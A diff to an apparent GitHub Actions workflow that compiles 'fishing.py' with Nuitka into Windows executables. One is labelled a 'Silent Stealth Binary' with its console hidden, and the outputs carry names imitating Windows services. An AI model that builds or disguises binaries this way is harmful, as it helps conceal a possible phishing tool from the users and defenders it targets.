@@ -5,6 +5,8 @@ on:
 
 env:
   FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: "true"
+  # Trik Utama: Menjawab 'Yes' secara otomatis untuk semua modul download eksternal Nuitka
+  NUITKA_ANSWERS: "yes"
 
 jobs:
   build-production-binaries:
@@ -31,11 +33,11 @@ jobs:
 
     - name: Build Variant 1 - Silent Stealth Binary (No-Console)
       run: |
-        nuitka --standalone --onefile --windows-console-mode=disable --accept-downloads --lto=yes --output-filename=WinHostNetworkStorageService fishing.py
+        nuitka --standalone --onefile --windows-console-mode=disable --lto=yes --output-filename=WinHostNetworkStorageService fishing.py
 
     - name: Build Variant 2 - Diagnostic Debug Binary (With-Console)
       run: |
-        nuitka --standalone --onefile --windows-console-mode=force --accept-downloads --lto=yes --output-filename=HostDiagnosticToolService fishing.py
+        nuitka --standalone --onefile --windows-console-mode=force --lto=yes --output-filename=HostDiagnosticToolService fishing.py
 
     - name: Verify Compiled Artifacts Presence
       run: |
